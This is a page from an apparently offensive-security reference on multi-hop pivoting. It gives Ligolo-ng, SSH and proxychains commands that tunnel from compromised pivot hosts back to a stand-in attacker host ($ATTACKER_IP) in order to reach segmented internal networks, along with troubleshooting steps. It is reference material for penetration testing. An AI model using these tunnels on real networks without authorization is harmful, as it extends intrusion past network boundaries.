---
authors: felixbillieres, H4tsuM1ku
category: infra
---

# Multi-hop pivoting

## Theory

Multi-hop pivoting (double pivot or chained pivoting) extends access through multiple network segments when a single pivot point is insufficient.

**When to use multi-hop:**
* Target networks are separated by multiple network boundaries
* Multiple compromised hosts are available to bridge networks
* Direct access to target networks is not possible from the initial pivot

> [!NOTE]
> Multi-hop increases complexity and potential failure points. Each hop adds latency. Choose the simplest solution that meets your requirements.

## Architecture

```
Attacker → Pivot1 → Pivot2 → Target Network
```

Each pivot host bridges two network segments.

## Practice

### Multi-hop with Ligolo-ng (Recommended)

Ligolo-ng provides the most transparent multi-hop experience. See [Ligolo-ng](techniques/ligolo-ng.md#multi-hop) for detailed setup.

**Quick setup:**

```bash
# Attacker: single proxy server
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot1
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# Pivot2 (if can reach attacker directly)
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# Pivot2 (if behind pivot1 - port forward first)
# On pivot1:
ssh -N -R 11601:localhost:11601 $USER@$ATTACKER_IP
# Then on pivot2:
./agent -connect $PIVOT1_IP:11601 -ignore-cert

# In Ligolo-ng interface
ligolo-ng > ifconfig routes add 192.168.1.0/24  # Via pivot1
ligolo-ng > ifconfig routes add 10.0.0.0/24      # Via pivot2
```

### Multi-hop with chained SOCKS proxies

Chain multiple SOCKS proxies using proxychains. See [SOCKS proxy](techniques/socks-proxy.md#multi-hop) for detailed setup.

**Quick setup:**

```bash
# First hop: attacker -> pivot1
ssh -N -D 1080 $USER@$PIVOT1_HOST

# Second hop: pivot1 -> pivot2
# On pivot1:
ssh -N -D 1081 $USER@$PIVOT2_HOST

# Configure proxychains
# /etc/proxychains4.conf
strict_chain
socks5 127.0.0.1 1080  # First hop
socks5 $PIVOT1_IP 1081 # Second hop
```

### Multi-hop with port forwarding

Chain port forwards through multiple hosts. See [Port forwarding](techniques/port-forwarding.md#multi-hop) for detailed setup.

> [!WARNING]
> Chained port forwarding is complex and error-prone. For multi-hop scenarios, prefer Ligolo-ng or chained SOCKS proxies.

**Quick example (SSH):**

```bash
# First hop: attacker -> pivot1 (forwards pivot2's SSH port)
ssh -N -L 2222:$PIVOT2_HOST:22 $USER@$PIVOT1_HOST

# Second hop: through pivot1 to pivot2 (forwards target service)
ssh -N -L 8080:$TARGET:80 -p 2222 $USER@localhost
```

## Troubleshooting

**Agent cannot reach proxy:**

```bash
# Test connectivity
nc -zv $ATTACKER_IP 11601

# If blocked, set up port forward on intermediate host
ssh -N -R 11601:localhost:11601 $USER@$ATTACKER_IP
```

**Routes not working (Ligolo-ng):**

```bash
# Verify routes
ligolo-ng > ifconfig routes list

# Test connectivity
ping $TARGET_IP
```

**SOCKS chain failures:**

```bash
# Test each proxy individually
proxychains4 -f /tmp/test1.conf curl http://$TARGET

# Verify proxy connectivity
nc -zv $PIVOT1_IP 1080
nc -zv $PIVOT2_IP 1081
```

**SSH tunnel breaks:**

```bash
# Check tunnel status
ps aux | grep "ssh.*-L\|ssh.*-D"

# Restart with keepalive
ssh -N -o ServerAliveInterval=60 -L 2222:$PIVOT2_HOST:22 $USER@$PIVOT1_HOST
```

## Decision guide

| Scenario | Recommended Technique | Notes |
|----------|----------------------|-------|
| Full network access needed | Ligolo-ng multi-agent | Best tool compatibility, transparent |
| Multiple tools, TCP-based | Chained SOCKS proxies | Requires proxychains configuration |
| Single service access | Multi-hop SSH port forwarding | Simple but limited to specific ports |
| Complex network topology | Ligolo-ng | Automatic routing, handles complex scenarios |

## Resources

* [Choosing a technique](choosing-a-technique.md) - When to use multi-hop
* [Ligolo-ng](techniques/ligolo-ng.md) - Best multi-hop solution
* [SOCKS proxy](techniques/socks-proxy.md) - Chained SOCKS proxies
* [Port forwarding](techniques/port-forwarding.md) - Chained port forwarding
* [Operations](operations.md) - Using multi-hop pivots
* [Persistence](persistence.md) - Maintaining multi-hop access
